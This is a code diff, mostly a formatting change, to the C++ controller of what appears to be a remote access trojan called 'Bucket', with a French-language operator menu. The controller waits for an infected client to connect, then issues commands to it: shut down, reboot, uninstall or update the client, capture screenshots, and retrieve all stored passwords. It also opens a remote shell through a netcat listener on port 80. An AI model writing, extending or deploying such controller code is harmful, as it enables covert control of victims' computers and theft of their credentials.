@@ -17,29 +17,29 @@ using namespace System;
 
 void command(Session& session);
 
-class ExitCallback : public Callback
-{
+class ExitCallback : public Callback {
 	public:
-		ExitCallback() : Callback("Quitter"){}
-		virtual void execute()
-		{
+		ExitCallback() : Callback("Quitter") {}
+		virtual void execute() {
 			exiting = true;
 		}
-		
-		static void exit(){exiting = true;}
-		static bool exited(){return exiting;}
+
+		static void exit() {
+			exiting = true;
+		}
+		static bool exited() {
+			return exiting;
+		}
 
 	private:
 		static bool exiting;
 };
 bool ExitCallback::exiting = false;
 
-class GetClientNameCallback : public Callback
-{
+class GetClientNameCallback : public Callback {
 	public:
-		GetClientNameCallback(Session& _session) : Callback("Nom du client"), session(_session){}
-		virtual void execute()
-		{
+		GetClientNameCallback(Session& _session) : Callback("Nom du client"), session(_session) {}
+		virtual void execute() {
 			string buffer;
 			session << GET_CLIENT_NAME;
 			session >> buffer;
@@ -50,242 +50,209 @@ class GetClientNameCallback : public Callback
 		Session& session;
 };
 
-class SystemVersionCallback : public Callback
-{
+class SystemVersionCallback : public Callback {
 	public:
-		SystemVersionCallback(Session& _session) : Callback("Version du systeme d'exploitation"), session(_session){}
-		virtual void execute()
-		{
+		SystemVersionCallback(Session& _session) : Callback("Version du systeme d'exploitation"), session(_session) {}
+		virtual void execute() {
 			string buffer;
 			session << GET_WINDOWS_VERSION;
 			session >> buffer;
 			cout << "Version systeme d'exploitation : " << buffer << "\n";
 		}
 
-	private:	
+	private:
 		Session& session;
 };
 
-class ShutdownCallback : public Callback
-{
+class ShutdownCallback : public Callback {
 	public:
-		
-		ShutdownCallback(Session& _session) : Callback("Eteindre PC"), session(_session){}
-		virtual void execute()
-		{
+
+		ShutdownCallback(Session& _session) : Callback("Eteindre PC"), session(_session) {}
+		virtual void execute() {
 			cout << "Extinction du client.\n";
 			session << SHUTDOWN;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class RebootCallback : public Callback
-{
+class RebootCallback : public Callback {
 	public:
-		
-		RebootCallback(Session& _session) : Callback("Reboot PC"), session(_session){}
-		virtual void execute()
-		{
+
+		RebootCallback(Session& _session) : Callback("Reboot PC"), session(_session) {}
+		virtual void execute() {
 			cout << "Redemarrage du client.\n";
 			session << REBOOT;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class LogoutCallback : public Callback
-{
+class LogoutCallback : public Callback {
 	public:
-		
-		LogoutCallback(Session& _session) : Callback("Logout Session"), session(_session){}
-		virtual void execute()
-		{
+
+		LogoutCallback(Session& _session) : Callback("Logout Session"), session(_session) {}
+		virtual void execute() {
 			cout << "Fermeture de la session utilisateur.\n";
 			session << LOGOUT;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class HibernateCallback : public Callback
-{
+class HibernateCallback : public Callback {
 	public:
-		
-		HibernateCallback(Session& _session) : Callback("Mise en veille PC"), session(_session){}
-		virtual void execute()
-		{
+
+		HibernateCallback(Session& _session) : Callback("Mise en veille PC"), session(_session) {}
+		virtual void execute() {
 			cout << "Mise en veille du client.\n";
 			session << HIBERNATE;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class KillClientCallback : public Callback
-{
+class KillClientCallback : public Callback {
 	public:
-		
-		KillClientCallback(Session& _session) : Callback("Tuer client"), session(_session){}
-		virtual void execute()
-		{
+
+		KillClientCallback(Session& _session) : Callback("Tuer client"), session(_session) {}
+		virtual void execute() {
 			cout << "Le programme client va etre tuer.\n";
 			session << KILL_CLIENT;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class RebootClientCallback : public Callback
-{
+class RebootClientCallback : public Callback {
 	public:
-		
-		RebootClientCallback(Session& _session) : Callback("Redemarrer client"), session(_session){}
-		virtual void execute()
-		{
+
+		RebootClientCallback(Session& _session) : Callback("Redemarrer client"), session(_session) {}
+		virtual void execute() {
 			cout << "Redemarrage du programme client.\n";
 			session << REBOOT_CLIENT;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class UninstallClientCallback : public Callback
-{
+class UninstallClientCallback : public Callback {
 	public:
-		
-		UninstallClientCallback(Session& _session) : Callback("Desinstaller client"), session(_session){}
-		virtual void execute()
-		{
+
+		UninstallClientCallback(Session& _session) : Callback("Desinstaller client"), session(_session) {}
+		virtual void execute() {
 			cout << "Desinstallation du programme client.\n";
 			session << UNINSTALL_CLIENT;
 			ExitCallback::exit();
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class UpdateClientCallback : public Callback
-{
+class UpdateClientCallback : public Callback {
 	public:
-		
-		UpdateClientCallback(Session& _session) : Callback("Mise a jour du client"), session(_session){}
-		virtual void execute()
-		{
+
+		UpdateClientCallback(Session& _session) : Callback("Mise a jour du client"), session(_session) {}
+		virtual void execute() {
 			cout << "Mise a jour du client, entrer le chemin du nouveau client : ";
 			string buffer;
 			cin >> buffer;
-			
+
 			session << UPGRADE_CLIENT;
 			string answer;
 			session >> answer;
-			if(answer == SUCCESS)
-			{
+			if(answer == SUCCESS) {
 				Upload upload(buffer, session.stream());
 				upload.launch();
 				session << REBOOT;
 				cout << "Le client a ete correctement mis a jour.\n";
-			}
-			else
-			{
+			} else {
 				cout << "Impossible de mettre a jour le client.\n";
 			}
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class ShellCallback : public Callback
-{
+class ShellCallback : public Callback {
 	public:
-		
-		ShellCallback(Session& _session) : Callback("Shell a distance"), session(_session){}
-		virtual void execute()
-		{
-			if(isReadable(SHELL_PROGRAM))
-			{
+
+		ShellCallback(Session& _session) : Callback("Shell a distance"), session(_session) {}
+		virtual void execute() {
+			if(isReadable(SHELL_PROGRAM)) {
 				session << REMOTE_SHELL;
 				system(".\\nc.exe -l -p 80");
-			}
-			else
-			{
+			} else {
 				cout << "Impossible de trouver " << SHELL_PROGRAM << '\n';
 			}
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class ScreenshotCallback : public Callback
-{
+class ScreenshotCallback : public Callback {
 	public:
-		
-		ScreenshotCallback(Session& _session) : Callback("Screenshot"), session(_session){}
-		virtual void execute()
-		{
+
+		ScreenshotCallback(Session& _session) : Callback("Screenshot"), session(_session) {}
+		virtual void execute() {
 			cout << "Screenshot.\n";
 			session << GET_SCREEN;
 			string quality = "80";
 			session << quality;
 			string buffer_photo;
-            InMemoryDownload download(buffer_photo, session.stream());
+			InMemoryDownload download(buffer_photo, session.stream());
 			download.launch();
 			cout << "Taille de la photo : " + buffer_photo.size();
-			
+
 			string filename = "capture.jpg";
 			ofstream outfile (filename.c_str(),ofstream::binary);
 			outfile.write(buffer_photo.c_str(), buffer_photo.size());
 			outfile.close();
-			
+
 			ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOW);
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class GetPasswordsCallback : public Callback
-{
+class GetPasswordsCallback : public Callback {
 	public:
-		
-		GetPasswordsCallback(Session& _session) : Callback("Recuperer mots de passe"), session(_session){}
-		virtual void execute()
-		{
+
+		GetPasswordsCallback(Session& _session) : Callback("Recuperer mots de passe"), session(_session) {}
+		virtual void execute() {
 			session << PASSWORDS_GETALL;
 			LOG << "Waiting for passwords";
 			string buffer;
 			session >> buffer;
-			if(buffer == FINISHED)
-			{
+			if(buffer == FINISHED) {
 				return;
 			}
 			LOG << "Passwords : " + buffer;
 		}
-	
-	private:	
+
+	private:
 		Session& session;
 };
 
-class Bucket
-{
+class Bucket {
 	public:
-		Bucket()
-		{
+		Bucket() {
 			menu.add(new ExitCallback);
 			menu.add(new GetClientNameCallback(session));
 			menu.add(new SystemVersionCallback(session));
@@ -301,21 +268,17 @@ class Bucket
 			menu.add(new ScreenshotCallback(session));
 			menu.add(new GetPasswordsCallback(session));
 		}
-		
-		void catchClient(Network::Port port, std::string password)
-		{
+
+		void catchClient(Network::Port port, std::string password) {
 			//session.setAuthentication(new StringBasedAuth(password));
 			info.port = port;
 			info.deadline.set(5);
 			info.password = password;
-			if(session.wait_connect(info))
-			{
+			if(session.wait_connect(info)) {
 				cout << "Client connecte.\n";
 				command(session);
 				cout << "Deconnexion.\n";
-			}
-			else
-			{
+			} else {
 				cout << "Aucune connexion de client.\n";
 			}
 		}
@@ -325,42 +288,34 @@ class Bucket
 		ConnectionInfo info;
 
 	private:
-		
-		void command(Session& session)
-		{
-			while(!ExitCallback::exited())
-			{
+
+		void command(Session& session) {
+			while(!ExitCallback::exited()) {
 				menu.show();
 				menu.prompt();
 			}
 		}
 };
 
-int main(int argc, char * argv[])
-{
-	if(argc != 3)
-	{
+int main(int argc, char * argv[]) {
+	if(argc != 3) {
 		cout << "Usage : bucket port password\n";
 		return EXIT_SUCCESS;
 	}
 
 	LOG.setHeader("BUCKET");
 	LOG.addObserver(new LogToNetwork("127.0.0.1", 80));
-	
+
 	Network::Port port = 0;
-	if(!fromString(argv[1], port))
-	{
+	if(!fromString(argv[1], port)) {
 		cout << "Port d'ecoute invalide : " << argv[1] << '\n';
 		return EXIT_FAILURE;
 	}
 	cout << "Port d'ecoute selectionne : " << port << '\n';
-	try
-	{
+	try {
 		Bucket bucket;
 		bucket.catchClient(port, argv[2]);
-	}
-	catch(Common::Exception&)
-	{
+	} catch(Common::Exception&) {
 	}
 	CATCH_UNKNOWN_EXCEPTION
 	return EXIT_SUCCESS;
